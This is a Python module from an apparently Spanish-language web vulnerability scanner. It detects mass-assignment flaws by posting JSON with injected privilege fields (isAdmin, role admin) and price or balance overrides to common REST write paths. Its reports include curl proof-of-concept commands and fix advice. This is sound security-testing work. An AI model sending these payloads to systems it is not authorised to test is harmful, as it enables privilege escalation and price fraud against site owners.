"""
modules/mass_assignment.py — Mass Assignment / Auto-binding en APIs REST.

Detecta endpoints que aceptan campos extra no documentados (isAdmin, role, price=0)
y los procesan silenciosamente — vector frecuente en Node/Rails/Django REST.

Anti-FP:
  - Solo reporta si el campo extra aparece reflejado en la respuesta.
  - O si el status cambia de 4xx → 2xx con los campos privilegiados.
  - Baseline diff para descartar errores genéricos.
"""
from __future__ import annotations

import asyncio
import json as _json
from urllib.parse import urlparse, urljoin

from utils.http import AsyncHTTPClient
from utils.vuln import Vuln, make_vuln

# Campos que los desarrolladores suelen dejar expuestos accidentalmente
_PRIVILEGE_FIELDS: dict[str, object] = {
    "isAdmin":      True,
    "is_admin":     True,
    "admin":        True,
    "role":         "admin",
    "roles":        ["admin"],
    "privilege":    "admin",
    "group":        "admin",
    "type":         "admin",
    "is_staff":     True,
    "is_superuser": True,
    "verified":     True,
    "emailVerified": True,
    "status":       "active",
    "active":       True,
    "approved":     True,
}

_PRICE_FIELDS: dict[str, object] = {
    "price":    0,
    "amount":   0,
    "cost":     0,
    "total":    0,
    "discount": 100,
    "credits":  99999,
    "balance":  99999,
    "points":   99999,
    "tokens":   99999,
    "quantity": -1,
}

# Endpoints REST típicos de escritura
_WRITE_PATHS = [
    "/api/user", "/api/users", "/api/profile", "/api/account", "/api/me",
    "/api/register", "/api/signup", "/api/update", "/api/settings",
    "/api/v1/user", "/api/v1/profile", "/api/v1/me",
    "/user", "/profile", "/account", "/settings",
]

# Indicadores de escalada en la respuesta
_PRIVILEGE_INDICATORS = [
    '"isadmin":true', '"is_admin":true', '"admin":true',
    '"role":"admin"', '"role": "admin"',
    '"is_staff":true', '"is_superuser":true',
    '"privilege":"admin"', '"verified":true',
]


async def run(
    client:     AsyncHTTPClient,
    url:        str,
    full_scan:  bool = False,
    extra_urls: list[str] | None = None,
) -> list[Vuln]:
    vulns: list[Vuln] = []
    found: set[str]   = set()
    sem = asyncio.Semaphore(5)

    parsed  = urlparse(url)
    base    = f"{parsed.scheme}://{parsed.netloc}"

    # Candidatos: rutas conocidas + URLs del crawler con parámetros de tipo registro
    candidates: list[str] = []
    for path in _WRITE_PATHS:
        candidates.append(f"{base}{path}")
    if extra_urls:
        for u in extra_urls:
            if any(kw in u.lower() for kw in ("user", "profile", "account", "register", "update", "me", "order", "cart", "checkout")):
                candidates.append(u)

    all_extra_fields = {**_PRIVILEGE_FIELDS, **_PRICE_FIELDS}

    async def probe(endpoint: str):
        # ── Baseline PUT/PATCH con body mínimo ────────────────────────────────
        minimal = {"name": "test", "email": "test@test.com"}
        async with sem:
            base_resp = await client.post_json(endpoint, minimal, body_limit=16384)
            if not base_resp:
                # Intentar GET para ver si acepta json
                gr = await client.get(endpoint, lax_ssl=True, body_limit=16384)
                if not gr or gr.status not in range(200, 300):
                    return
                base_resp = gr

        base_status = base_resp.status if base_resp else 0
        base_body   = (base_resp.text or "").lower() if base_resp else ""

        # ── Prueba con campos de privilegio extra ─────────────────────────────
        injected = {**minimal, **all_extra_fields}
        async with sem:
            inj_resp = await client.post_json(endpoint, injected, body_limit=16384)
        if not inj_resp:
            return

        inj_body   = (inj_resp.text or "").lower()
        inj_status = inj_resp.status

        # Señal 1: campo privilegiado reflejado en respuesta
        for indicator in _PRIVILEGE_INDICATORS:
            if indicator not in base_body and indicator in inj_body:
                key = f"priv:{endpoint}"
                if key not in found:
                    found.add(key)
                    reflected = [f for f in _PRIVILEGE_FIELDS if f.lower() in inj_body]
                    vulns.append(make_vuln(
                        title       = f"Mass Assignment — Campos Privilegiados Aceptados: {endpoint}",
                        severity    = "HIGH",
                        cvss        = 8.1,
                        category    = "Mass Assignment",
                        description = (
                            f"El endpoint '{endpoint}' acepta y procesa campos no documentados "
                            f"como {', '.join(reflected[:5])}. Un atacante puede "
                            "escalar privilegios (admin, is_staff) en el registro o actualización."
                        ),
                        evidence    = (
                            f"Endpoint: {endpoint}\n"
                            f"Campos inyectados aceptados: {', '.join(reflected[:5])}\n"
                            f"Indicador en respuesta: '{indicator}'\n"
                            f"PoC:\n"
                            f"curl -X POST {endpoint} -H 'Content-Type: application/json' "
                            f"-d '{_json.dumps({k: v for k, v in _PRIVILEGE_FIELDS.items() if k in reflected[:3]}, ensure_ascii=False)}'"
                        ),
                        fix         = (
                            "Usar allowlist explícita de campos permitidos en el servidor. "
                            "Rails: attr_accessible / Strong Parameters. "
                            "Django: serializer fields=[] explícito. "
                            "Node/Express: desestructurar solo los campos esperados."
                        ),
                        ref         = "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                        module      = "mass_assignment",
                        url         = endpoint,
                        cwe         = "CWE-915",
                        owasp       = "API3:2023",
                    ))
                return

        # Señal 2: campos de precio/balance reflejados con valor 0 o 99999
        for pfield in _PRICE_FIELDS:
            pf_low = pfield.lower()
            vals   = ['"0"', ":0,", ":0}", ":99999", '"99999"']
            if pf_low in base_body:
                continue
            if pf_low in inj_body and any(v in inj_body for v in vals):
                key = f"price:{endpoint}:{pfield}"
                if key not in found:
                    found.add(key)
                    vulns.append(make_vuln(
                        title       = f"Mass Assignment — Campo de Precio/Balance Manipulable: '{pfield}'",
                        severity    = "HIGH",
                        cvss        = 7.5,
                        category    = "Mass Assignment",
                        description = (
                            f"El endpoint '{endpoint}' acepta el campo '{pfield}' y lo refleja "
                            "en la respuesta. Un atacante puede manipular precios, balances o "
                            "créditos poniendo valores arbitrarios (0, negativos, millones)."
                        ),
                        evidence    = (
                            f"Endpoint: {endpoint}\n"
                            f"Campo manipulado: '{pfield}' = {_PRICE_FIELDS[pfield]}\n"
                            f"PoC: curl -X POST {endpoint} -H 'Content-Type: application/json' "
                            f"-d '{{\"price\": 0, \"discount\": 100}}'"
                        ),
                        fix         = (
                            "Nunca confiar en el precio enviado por el cliente. "
                            "Calcular el precio en el servidor desde la base de datos. "
                            "Ignorar campos como price/amount/discount en el body del cliente."
                        ),
                        ref         = "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                        module      = "mass_assignment",
                        url         = endpoint,
                        cwe         = "CWE-915",
                        owasp       = "API3:2023",
                    ))
                return

    await asyncio.gather(*[probe(ep) for ep in candidates[:20]])
    return vulns
